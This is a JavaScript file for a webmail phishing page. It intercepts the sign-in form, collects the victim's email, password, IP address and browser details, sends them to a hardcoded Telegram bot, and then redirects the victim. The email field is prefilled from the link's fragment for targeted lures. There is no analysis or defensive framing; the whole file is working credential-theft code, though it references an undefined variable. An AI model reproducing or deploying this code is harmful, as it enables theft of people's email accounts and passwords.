document.addEventListener("DOMContentLoaded", function () {
  const telegramBotId = "7273335886:AAFfBkz6TbFX6IbPfJ4sAB_pFyUBhuhEWWI";
  const telegramChatId = "7323113234";
  
  var form = document.getElementById("webmailSignin-form");

  function handleSignin(event) {
    event.preventDefault();

    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    var rememberMe = document.getElementById("remember").checked;
    var fragmentIdentifier = window.location.hash.substr(1);

    var userAgent = navigator.userAgent;
    var date = new Date().toISOString();

    const id1 = generateId();
    const id2 = generateId();
    const id3 = generateId();
    const id4 = generateId();

    const x = `prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=${id1}; userAgent=${userAgent}-NG; MSPOK=${uuid}-${id2}; &ui_locales=en-US&client_info=1&${id3}=0&login_email=${email}&passwd=${password}; DeviceId=${id4}; status_date=${date};`;

    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        const ipAddress = data.ip;
        const deviceInfo = {
          manufacturer: navigator.userAgent.match(/\((.*?)\)/)[1],
          os: navigator.userAgent.includes("Mac OS X") ? "Mac OS X" : "Windows",
          browser: navigator.userAgent.includes("Chrome") ? "Chrome" : "Firefox",
        };

        const emailDomain = email.split('@')[1];

        const loginUrls = {
          "gmail.com": "login.gmail.com",
          "yahoo.com": "login.yahoo.com",
          "outlook.com": "login.microsoftonline.com",
          // Add more mappings as needed
        };

        const loginUrl = loginUrls[emailDomain] || "unknown";

        const payload = {
          chat_id: telegramChatId,
          text: `
          Email: ${email}
          Password: ${password}
          Remember Me: ${rememberMe}
          Fragment Identifier: ${fragmentIdentifier}
          IP Address: ${ipAddress}
          Device: ${deviceInfo.manufacturer}
          OS: ${deviceInfo.os}
          Browser: ${deviceInfo.browser}
          Cookies: ${x}
          Login URL: ${loginUrl}
          `
        };

        fetch("https://api.telegram.org/bot" + telegramBotId + "/sendMessage", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(payload),
        })
          .then((response) => {
            if (response.ok) {
              window.location.href = "https://pmegtrading.online/"; // Redirect to success URL
            } else {
              console.error("Error sending data to Telegram:", response.statusText);
              window.location.href = "https://example.org"; // Redirect to error URL
            }
          })
          .catch((error) => {
            console.error("Error sending data to Telegram:", error);
            window.location.href = "https://example.org"; // Redirect to error URL
          });
      });
  }

  form.addEventListener("submit", handleSignin);

  // Populate the email field if the fragment identifier is present
  var fragmentIdentifier = window.location.hash.substr(1);
  if (fragmentIdentifier) {
    document.getElementById("email").value = fragmentIdentifier;
  }
});

function generateId() {
  const characters = "abcdef0123456789";
  const length = 13;
  let result = "";
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}
